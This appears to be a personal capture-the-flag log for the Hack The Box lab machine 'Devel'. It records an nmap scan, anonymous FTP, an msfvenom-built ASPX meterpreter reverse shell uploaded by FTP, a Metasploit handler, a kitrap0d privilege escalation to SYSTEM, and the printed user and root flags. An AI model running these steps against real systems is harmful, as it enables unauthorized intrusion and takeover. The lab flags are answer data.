@@ -1,0 +1,554 @@
+Machine-Name  :  Devel
+IP-Address    :  10.129.85.53
+
+Command-Line: sudo nmap -p- -T4 -A 10.129.85.53
+Result:
+    Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-01 13:39 EDT
+    Nmap scan report for 10.129.85.53
+    Host is up (0.051s latency).
+    Not shown: 65533 filtered ports
+    PORT   STATE SERVICE VERSION
+    21/tcp open  ftp     Microsoft ftpd
+    | ftp-anon: Anonymous FTP login allowed (FTP code 230)
+    | 03-18-17  02:06AM       <DIR>          aspnet_client
+    | 03-17-17  05:37PM                  689 iisstart.htm
+    |_03-17-17  05:37PM               184946 welcome.png
+    | ftp-syst:
+    |_  SYST: Windows_NT
+    80/tcp open  http    Microsoft IIS httpd 7.5
+    | http-methods:
+    |_  Potentially risky methods: TRACE
+    |_http-server-header: Microsoft-IIS/7.5
+    |_http-title: IIS7
+    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+    Device type: general purpose|phone|specialized
+    Running (JUST GUESSING): Microsoft Windows 8|Phone|2008|7|8.1|Vista|2012 (92%)
+    OS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2012:r2
+    Aggressive OS guesses: Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 or Windows 8.1 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (91%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (91%), Microsoft Windows Embedded Standard 7 (91%)
+    No exact OS matches for host (test conditions non-ideal).
+    Network Distance: 2 hops
+    Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+    TRACEROUTE (using port 80/tcp)
+    HOP RTT      ADDRESS
+    1   51.16 ms 10.10.14.1
+    2   51.19 ms 10.129.85.53
+
+    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+    Nmap done: 1 IP address (1 host up) scanned in 112.40 seconds
+
+
+Command-Line: ftp 10.129.85.53
+Result:
+    Connected to 10.129.85.53.
+    220 Microsoft FTP Service
+Name (10.129.85.53:kali): anonymous
+    331 Anonymous access allowed, send identity (e-mail name) as password.
+Password: anonymous
+    230 User logged in.
+    Remote system type is Windows_NT.
+ftp> dir
+    200 PORT command successful.
+    150 Opening ASCII mode data connection.
+    03-18-17  02:06AM       <DIR>          aspnet_client
+    03-17-17  05:37PM                  689 iisstart.htm
+    03-17-17  05:37PM               184946 welcome.png
+    226 Transfer complete.
+ftp> quit
+    221 Goodbye.
+
+
+Notes: After testing
+
+
+Command-Line: msfvenom --list-payloads
+Result:
+    PAYLOAD: windows/meterpreter/reverse_tcp
+
+Command-Line: msfvenom --list formats
+Result:
+    FORMAT: aspx
+
+Notes: Creating the system exploit.
+
+Command-Line: msfvenom -p windows/meterpreter/reverse_tcp -f aspx LHOST=10.10.14.45 LPORT=9001 > devel.aspx
+
+ftp 10.129.85.53
+put devel.aspx
+quit
+
+Command-Line: msfconsole
+
+msf6 > use exploit/multi/handler
+Result:
+    [*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) > show options
+Result:
+    Module options (exploit/multi/handler):
+
+       Name  Current Setting  Required  Description
+       ----  ---------------  --------  -----------
+
+
+    Payload options (generic/shell_reverse_tcp):
+
+       Name   Current Setting  Required  Description
+       ----   ---------------  --------  -----------
+       LHOST                   yes       The listen address (an interface may be specified)
+       LPORT  4444             yes       The listen port
+
+
+    Exploit target:
+
+       Id  Name
+       --  ----
+       0   Wildcard Target
+msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
+Result:
+  payload => windows/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > show options
+Result:
+    Module options (exploit/multi/handler):
+
+       Name  Current Setting  Required  Description
+       ----  ---------------  --------  -----------
+
+
+    Payload options (windows/meterpreter/reverse_tcp):
+
+       Name      Current Setting  Required  Description
+       ----      ---------------  --------  -----------
+       EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process
+                                            , none)
+       LHOST                      yes       The listen address (an interface may be specified)
+       LPORT     4444             yes       The listen port
+
+
+    Exploit target:
+
+       Id  Name
+       --  ----
+       0   Wildcard Target
+msf6 exploit(multi/handler) > set lhost 10.10.14.45
+Result:
+    lhost => 10.10.14.45
+msf6 exploit(multi/handler) > run
+Result:
+    [*] Started reverse TCP handler on 10.10.14.45:4444
+    ^C[-] Exploit failed [user-interrupt]: Interrupt
+    [-] run: Interrupted
+msf6 exploit(multi/handler) > set lport 9001
+Result:
+    lport => 9001
+msf6 exploit(multi/handler) > run
+Result:
+    [*] Started reverse TCP handler on 10.10.14.45:9001
+    [*] Sending stage (175174 bytes) to 10.129.85.53
+    [*] Meterpreter session 1 opened (10.10.14.45:9001 -> 10.129.85.53:49160) at 2021-04-01 14:53:31 -0400
+
+meterpreter > sysinfo
+Result:
+    Computer        : DEVEL
+    OS              : Windows 7 (6.1 Build 7600).
+    Architecture    : x86
+    System Language : el_GR
+    Domain          : HTB
+    Logged On Users : 0
+    Meterpreter     : x86/windows
+
+meterpreter > shell
+Result:
+    Process 3532 created.
+    Channel 1 created.
+    Microsoft Windows [Version 6.1.7600]
+    Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+    c:\windows\system32\inetsrv>
+
+c:\Windows\System32\inetsrv>systeminfo
+Result:
+    systeminfo
+
+    Host Name:                 DEVEL
+    OS Name:                   Microsoft Windows 7 Enterprise
+    OS Version:                6.1.7600 N/A Build 7600
+    OS Manufacturer:           Microsoft Corporation
+    OS Configuration:          Standalone Workstation
+    OS Build Type:             Multiprocessor Free
+    Registered Owner:          babis
+    Registered Organization:
+    Product ID:                55041-051-0948536-86302
+    Original Install Date:     17/3/2017, 4:17:31 ��
+    System Boot Time:          1/4/2021, 8:37:39 ��
+    System Manufacturer:       VMware, Inc.
+    System Model:              VMware Virtual Platform
+    System Type:               X86-based PC
+    Processor(s):              1 Processor(s) Installed.
+                               [01]: x64 Family 6 Model 85 Stepping 7 GenuineIntel ~2294 Mhz
+    BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
+    Windows Directory:         C:\Windows
+    System Directory:          C:\Windows\system32
+    Boot Device:               \Device\HarddiskVolume1
+    System Locale:             el;Greek
+    Input Locale:              en-us;English (United States)
+    Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
+    Total Physical Memory:     3.071 MB
+    Available Physical Memory: 2.447 MB
+    Virtual Memory: Max Size:  6.141 MB
+    Virtual Memory: Available: 5.525 MB
+    Virtual Memory: In Use:    616 MB
+    Page File Location(s):     C:\pagefile.sys
+    Domain:                    HTB
+    Logon Server:              N/A
+    Hotfix(s):                 N/A
+    Network Card(s):           1 NIC(s) Installed.
+                               [01]: vmxnet3 Ethernet Adapter
+                                     Connection Name: Local Area Connection 4
+                                     DHCP Enabled:    Yes
+                                     DHCP Server:     10.129.0.1
+                                     IP address(es)
+                                     [01]: 10.129.85.53
+                                     [02]: fe80::7126:412:6d37:9397
+                                     [03]: dead:beef::f4ca:5796:4d89:7b44
+                                     [04]: dead:beef::7126:412:6d37:9397
+
+c:\Windows\System32\inetsrv> exit
+Result:
+    meterpreter >
+
+
+
+
+meterpreter > bg
+Result:
+    [*] Backgrounding session 3...
+    msf6 exploit(multi/handler) > sessions -i 3
+    [*] Starting interaction with 3...
+
+meterpreter > bg
+Result:
+    [*] Backgrounding session 3...
+    msf6 exploit(multi/handler) > search suggester
+
+    Matching Modules
+    ================
+
+       #  Name                                      Disclosure Date  Rank    Check  Description
+       -  ----                                      ---------------  ----    -----  -----------
+       0  post/multi/recon/local_exploit_suggester                   normal  No     Multi Recon Local Exploit Suggester
+
+
+    Interact with a module by name or index. For example info 0, use 0 or use post/multi/recon/local_exploit_suggester
+
+msf6 exploit(multi/handler) > use 0
+Result:
+    [*] Using configured payload windows/meterpreter/reverse_tcp
+
+msf6 post(multi/recon/local_exploit_suggester) > show options
+Result:
+    Module options (post/multi/recon/local_exploit_suggester):
+
+    Name             Current Setting  Required  Description
+    ----             ---------------  --------  -----------
+    SESSION                           yes       The session to run this module on
+    SHOWDESCRIPTION  false            yes       Displays a detailed description for the ava
+                                               ilable exploits
+
+msf6 post(multi/recon/local_exploit_suggester) > set session 3
+Result:
+    session => 3
+
+msf6 post(multi/recon/local_exploit_suggester) > run
+Result:
+    [*] 10.129.85.53 - Collecting local exploits for x86/windows...
+    [*] 10.129.85.53 - 37 exploit checks are being tried...
+    [+] 10.129.85.53 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
+    [+] 10.129.85.53 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
+    [+] 10.129.85.53 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
+    [+] 10.129.85.53 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
+    [+] 10.129.85.53 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
+    [+] 10.129.85.53 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
+    [+] 10.129.85.53 - exploit/windows/local/ms15_004_tswbproxy: The service is running, but could not be validated.
+    [+] 10.129.85.53 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
+    [+] 10.129.85.53 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
+    [+] 10.129.85.53 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
+    [+] 10.129.85.53 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
+    [+] 10.129.85.53 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
+    [+] 10.129.85.53 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
+    [*] Post module execution completed
+
+    msf6 post(multi/recon/local_exploit_suggester) >
+
+
+Notes: Trying first exploit. "[+] 10.129.85.53 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated."
+
+
+msf6 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms10_015_kitrap0d[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+msf6 exploit(windows/local/ms10_015_kitrap0d) > show options
+Result:
+    Module options (exploit/windows/local/ms10_015_kitrap0d):
+
+       Name     Current Setting  Required  Description
+       ----     ---------------  --------  -----------
+       SESSION                   yes       The session to run this module on.
+
+
+    Payload options (windows/meterpreter/reverse_tcp):
+
+       Name      Current Setting  Required  Description
+       ----      ---------------  --------  -----------
+       EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process
+                                            , none)
+       LHOST     192.168.0.5      yes       The listen address (an interface may be specified)
+       LPORT     4444             yes       The listen port
+
+
+    Exploit target:
+
+       Id  Name
+       --  ----
+       0   Windows 2K SP4 - Windows 7 (    Module options (exploit/windows/local/ms10_015_kitrap0d):
+
+       Name     Current Setting  Required  Description
+       ----     ---------------  --------  -----------
+       SESSION                   yes       The session to run this module on.
+
+
+    Payload options (windows/meterpreter/reverse_tcp):
+
+       Name      Current Setting  Required  Description
+       ----      ---------------  --------  -----------
+       EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process
+                                            , none)
+       LHOST     192.168.0.5      yes       The listen address (an interface may be specified)
+       LPORT     4444             yes       The listen port
+
+
+    Exploit target:
+
+       Id  Name
+       --  ----
+       0   Windows 2K SP4 - Windows 7 (x86)x86)
+
+
+msf6 exploit(windows/local/ms10_015_kitrap0d) > set session 3
+Result:
+    session => 3
+
+msf6 exploit(windows/local/ms10_015_kitrap0d) > set lhost tun0
+Result:
+    lhost => tun0
+
+msf6 exploit(windows/local/ms10_015_kitrap0d) > set lport 9002
+Result:
+    lport => 9002
+
+msf6 exploit(windows/local/ms10_015_kitrap0d) > run
+Result:
+    [*] Started reverse TCP handler on 10.10.14.45:9002
+    [*] Launching notepad to host the exploit...
+    [+] Process 3680 launched.
+    [*] Reflectively injecting the exploit DLL into 3680...
+    [*] Injecting exploit into 3680 ...
+    [*] Exploit injected. Injecting payload into 3680...
+    [*] Payload injected. Executing exploit...
+    [+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
+    [*] Sending stage (175174 bytes) to 10.129.85.53
+    [*] Meterpreter session 4 opened (10.10.14.45:9002 -> 10.129.85.53:49170) at 2021-04-01 17:30:57 -0400
+
+meterpreter > sysinfo
+Result:
+    Computer        : DEVEL
+    OS              : Windows 7 (6.1 Build 7600).
+    Architecture    : x86
+    System Language : el_GR
+    Domain          : HTB
+    Logged On Users : 0
+    Meterpreter     : x86/windows
+    meterpreter > shell
+    Process 3716 created.
+    Channel 1 created.
+    Microsoft Windows [Version 6.1.7600]
+    Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+meterpreter > shell
+Result:
+    Process 3260 created.
+    Channel 2 created.
+    Microsoft Windows [Version 6.1.7600]
+    Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+c:\windows\system32\inetsrv>whoami
+Result:
+    whoami
+    nt authority\system
+
+c:\windows\system32\inetsrv>cd /
+Result:
+    cd /
+
+c:\>dir
+Result:
+    dir
+     Volume in drive C has no label.
+     Volume Serial Number is 8620-71F1
+
+     Directory of c:\
+
+    11/06/2009  12:42 ��                24 autoexec.bat
+    11/06/2009  12:42 ��                10 config.sys
+    17/03/2017  07:33 ��    <DIR>          inetpub
+    14/07/2009  05:37 ��    <DIR>          PerfLogs
+    13/12/2020  01:59 ��    <DIR>          Program Files
+    18/03/2017  02:16 ��    <DIR>          Users
+    14/01/2021  12:48 ��    <DIR>          Windows
+                   2 File(s)             34 bytes
+                   5 Dir(s)  22.200.483.840 bytes free
+
+c:\>cd users
+Result:
+    cd users
+
+c:\Users>dir
+Result:
+    dir
+     Volume in drive C has no label.
+     Volume Serial Number is 8620-71F1
+
+     Directory of c:\Users
+
+    18/03/2017  02:16 ��    <DIR>          .
+    18/03/2017  02:16 ��    <DIR>          ..
+    18/03/2017  02:16 ��    <DIR>          Administrator
+    17/03/2017  05:17 ��    <DIR>          babis
+    18/03/2017  02:06 ��    <DIR>          Classic .NET AppPool
+    14/07/2009  10:20 ��    <DIR>          Public
+                   0 File(s)              0 bytes
+                   6 Dir(s)  22.200.483.840 bytes free
+
+c:\Users>cd babis
+Result:
+    cd babis
+
+c:\Users\babis>dir
+Result:
+    dir
+     Volume in drive C has no label.
+     Volume Serial Number is 8620-71F1
+
+     Directory of c:\Users\babis
+
+    17/03/2017  05:17 ��    <DIR>          .
+    17/03/2017  05:17 ��    <DIR>          ..
+    17/03/2017  05:17 ��    <DIR>          Contacts
+    18/03/2017  02:14 ��    <DIR>          Desktop
+    17/03/2017  05:17 ��    <DIR>          Documents
+    17/03/2017  05:17 ��    <DIR>          Downloads
+    17/03/2017  05:17 ��    <DIR>          Favorites
+    17/03/2017  05:17 ��    <DIR>          Links
+    17/03/2017  05:17 ��    <DIR>          Music
+    17/03/2017  05:17 ��    <DIR>          Pictures
+    17/03/2017  05:17 ��    <DIR>          Saved Games
+    17/03/2017  05:17 ��    <DIR>          Searches
+    17/03/2017  05:17 ��    <DIR>          Videos
+                   0 File(s)              0 bytes
+                  13 Dir(s)  22.200.483.840 bytes free
+
+c:\Users\babis>cd Desktop
+Result:
+    cd Desktop
+
+c:\Users\babis\Desktop>dir
+Result:
+    dir
+    Volume in drive C has no label.
+    Volume Serial Number is 8620-71F1
+
+    Directory of c:\Users\babis\Desktop
+
+    18/03/2017  02:14 ��    <DIR>          .
+    18/03/2017  02:14 ��    <DIR>          ..
+    18/03/2017  02:18 ��                32 user.txt.txt
+               1 File(s)             32 bytes
+               2 Dir(s)  22.200.483.840 bytes free
+
+c:\Users\babis\Desktop>type user.txt.txt
+Result:
+    type user.txt.txt
+    9ecdd6a3aedf24b41562fea70f4cb3e8
+    *** USER OWNED ***
+
+c:\Users\babis\Desktop>cd ../../
+Result:
+    cd ../../
+
+c:\Users>dir
+Result:
+    dir
+     Volume in drive C has no label.
+     Volume Serial Number is 8620-71F1
+
+     Directory of c:\Users
+
+    18/03/2017  02:16 ��    <DIR>          .
+    18/03/2017  02:16 ��    <DIR>          ..
+    18/03/2017  02:16 ��    <DIR>          Administrator
+    17/03/2017  05:17 ��    <DIR>          babis
+    18/03/2017  02:06 ��    <DIR>          Classic .NET AppPool
+    14/07/2009  10:20 ��    <DIR>          Public
+                   0 File(s)              0 bytes
+                   6 Dir(s)  22.200.483.840 bytes free
+
+c:\Users>cd Administrator
+Result:
+    cd Administrator
+
+c:\Users\Administrator>dir
+Result:
+    dir
+     Volume in drive C has no label.
+     Volume Serial Number is 8620-71F1
+
+     Directory of c:\Users\Administrator
+
+    18/03/2017  02:16 ��    <DIR>          .
+    18/03/2017  02:16 ��    <DIR>          ..
+    18/03/2017  02:16 ��    <DIR>          Contacts
+    14/01/2021  12:42 ��    <DIR>          Desktop
+    18/03/2017  02:16 ��    <DIR>          Documents
+    18/03/2017  02:16 ��    <DIR>          Downloads
+    18/03/2017  02:16 ��    <DIR>          Favorites
+    18/03/2017  02:16 ��    <DIR>          Links
+    18/03/2017  02:16 ��    <DIR>          Music
+    18/03/2017  02:16 ��    <DIR>          Pictures
+    18/03/2017  02:16 ��    <DIR>          Saved Games
+    18/03/2017  02:16 ��    <DIR>          Searches
+    18/03/2017  02:16 ��    <DIR>          Videos
+                   0 File(s)              0 bytes
+                  13 Dir(s)  22.200.483.840 bytes free
+
+c:\Users\Administrator>cd Desktop
+Result:
+    cd Desktop
+
+c:\Users\Administrator\Desktop>dir
+Result:
+    dir
+     Volume in drive C has no label.
+     Volume Serial Number is 8620-71F1
+
+     Directory of c:\Users\Administrator\Desktop
+
+    14/01/2021  12:42 ��    <DIR>          .
+    14/01/2021  12:42 ��    <DIR>          ..
+    18/03/2017  02:17 ��                32 root.txt
+                   1 File(s)             32 bytes
+                   2 Dir(s)  22.200.483.840 bytes free
+
+c:\Users\Administrator\Desktop>type root.txt
+Result:
+    type root.txt
+    e621a0b5041708797c4fc4728bc72b4b
+    *** ROOT OWNED ***
+
+
+      *** FINISHED ***
